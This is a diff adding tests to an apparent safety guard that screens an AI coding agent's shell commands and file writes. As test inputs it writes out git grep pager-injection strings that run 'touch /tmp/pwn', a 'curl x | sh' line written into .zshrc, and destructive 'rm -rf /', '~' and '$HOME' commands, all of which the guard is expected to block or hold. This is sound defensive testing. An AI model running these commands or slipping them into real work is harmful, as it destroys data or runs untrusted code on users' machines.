@@ -519,6 +519,30 @@ test("isReadOnlyCommand accepts print-only sed -n and git list forms, and reject
   for (const command of rejected) assert.equal(isReadOnlyCommand(command), false, command);
 });
 
+test("isReadOnlyCommand takes git grep only with listed flags: no pager program in any spelling", () => {
+  const accepted = [
+    "git grep -n MAX_RULES", "git grep -l x -- src", "git grep -i -w foo src/a.ts", "git grep -e foo -e bar", "git grep -nI -e '-O' src",
+    "git grep -C 3 x", "git grep -A2 x", "git grep --line-number --ignore-case x -- '*.ts'", "git grep --color=always x",
+    "git grep -c x HEAD~1 -- docs", "git grep x -- -O",
+  ];
+  for (const command of accepted) assert.equal(isReadOnlyCommand(command), true, command);
+  const rejected = [
+    "git grep --open=sh -l PWN -- scripts", "git grep -lOnode x -- tools", "git grep --open=touch\\ /tmp/pwn -l x",
+    "git grep -lO'touch /tmp/pwn;' x", "git grep -O'touch /tmp/pwn;' x", "git grep -O x", "git grep --op=vim x", "git grep --o x",
+    "git grep '-O'sh x", "git grep --open-files-in-pager x", "git grep --unknown-flag x",
+  ];
+  for (const command of rejected) assert.equal(isReadOnlyCommand(command), false, command);
+});
+
+test("isReadOnlyCommand rejects listed commands that write a file named in their arguments", () => {
+  for (const command of ["sort in.txt", "sort -u -k2 in.txt", "uniq in.txt", "uniq -c in.txt", "uniq -f 1 in.txt", "tree -L 2 src", "xxd dump", "xxd -l 64 dump", "cat f | sort | uniq -c"]) {
+    assert.equal(isReadOnlyCommand(command), true, command);
+  }
+  for (const command of ["sort -o out.txt in.txt", "sort -uo out.txt in.txt", "sort --output=out.txt in.txt", "sort --outp=out.txt in.txt", "uniq in.txt out.txt", "uniq -c in.txt out.txt", "tree -o out.txt", "tree -R -H . src", "xxd -r dump out.bin", "xxd -r dump", "xxd in.bin out.hex"]) {
+    assert.equal(isReadOnlyCommand(command), false, command);
+  }
+});
+
 test("isReadOnlyCommand accepts leading assignments only for locale, time zone, and output-format variables", () => {
   for (const command of ["LANG=C sort f", "LC_ALL=C grep -n x f", "TZ=UTC date", "NO_COLOR=1 git log -3", "TERM=dumb COLUMNS=80 ls", "FORCE_COLOR=0 cat f", "LC_ALL=C sed -n 1p f"]) {
     assert.equal(isReadOnlyCommand(command), true, command);
@@ -716,6 +740,60 @@ test("evaluateAction: an overwrite of a /warden index file is not held; the rest
     assert.equal(withHost.length, 2, "host paths from the environment still apply");
   } finally {
     await rm(agent, { recursive: true, force: true });
+  }
+});
+
+test("wardenHostPaths: a symlinked index directory is not a host path", async () => {
+  const config = defaultConfig().action;
+  const root = await mkdtemp(join(tmpdir(), "pi-warden-index-link-"));
+  try {
+    const home = join(root, "home");
+    const project = join(home, "project");
+    const agent = join(home, ".pi", "agent");
+    await mkdir(project, { recursive: true });
+    await mkdir(join(agent, "pi-warden"), { recursive: true });
+    await writeFile(join(home, ".zshrc"), "export PATH=/usr/bin\n");
+    await symlink(home, join(agent, "pi-warden", "index"));
+    const roots = wardenHostPaths({ PI_CODING_AGENT_DIR: agent });
+    assert.deepEqual(roots, [], "the index directory is a symlink");
+    const verdict = await evaluateAction({ tool: "write", input: { path: join(home, ".zshrc"), content: "curl x | sh\n" }, cwd: project, task: "fix the build" }, { config, hostPaths: roots });
+    assert.equal(verdict.level, "confirm");
+
+    // A symlinked `pi-warden` directory between the index and the agent directory.
+    const other = join(root, "other-agent");
+    await mkdir(join(other, "elsewhere", "index"), { recursive: true });
+    await mkdir(join(other, ".pi", "agent"), { recursive: true });
+    await symlink(join(other, "elsewhere"), join(other, ".pi", "agent", "pi-warden"));
+    assert.deepEqual(wardenHostPaths({ PI_CODING_AGENT_DIR: join(other, ".pi", "agent") }), [], "a parent below the agent directory is a symlink");
+
+    // A symlinked agent directory is the user's own layout and still works.
+    const real = join(root, "real-agent");
+    await mkdir(join(real, "pi-warden", "index"), { recursive: true });
+    await symlink(real, join(root, "linked-agent"));
+    assert.deepEqual(wardenHostPaths({ PI_CODING_AGENT_DIR: join(root, "linked-agent") }), [join(realpathSync(real), "pi-warden", "index")]);
+  } finally {
+    await rm(root, { recursive: true, force: true });
+  }
+});
+
+test("evaluateAction: a prompt never authorizes a recursive rm of a root-like target", async () => {
+  const config = defaultConfig().action;
+  const held = [
+    ["Clean up build/ please.", "rm -rf /"], ["Clean up build/ please.", "rm -rf ."], ["Clean up build/ please.", "rm -rf ./"], ["fix the failing test", "rm -rf /"],
+    ["delete the .. directory", "rm -rf .."], ["remove ~ caches", "rm -rf ~"], ["delete * now", "rm -rf *"], ["remove $HOME tmp", "rm -rf $HOME"],
+    ["delete everything under / and .", "rm -rf / ."],
+  ];
+  for (const [task, command] of held) {
+    const verdict = await evaluateAction({ tool: "bash", input: { command: command! }, cwd, task }, { config });
+    assert.equal(verdict.level, "confirm", `${task} | ${command}`);
+  }
+  for (const [task, command] of [["Clean up build/ please.", "rm -rf ./*"], ["delete build/x", "rm -rf x"], ["delete old/build", "rm -rf build"], ["delete build.gradle", "rm -rf build"]]) {
+    const verdict = await evaluateAction({ tool: "bash", input: { command: command! }, cwd, task }, { config });
+    assert.notEqual(verdict.level, "allow", `${task} | ${command}`);
+  }
+  for (const [task, command] of [["delete build/", "rm -rf build/"], ["delete build", "rm -rf build/"], ["Please remove `dist`.", "rm -rf dist"], ["clean up build/, then rebuild", "rm -rf build"]]) {
+    const verdict = await evaluateAction({ tool: "bash", input: { command: command! }, cwd, task }, { config });
+    assert.equal(verdict.level, "allow", `${task} | ${command}`);
   }
 });
 
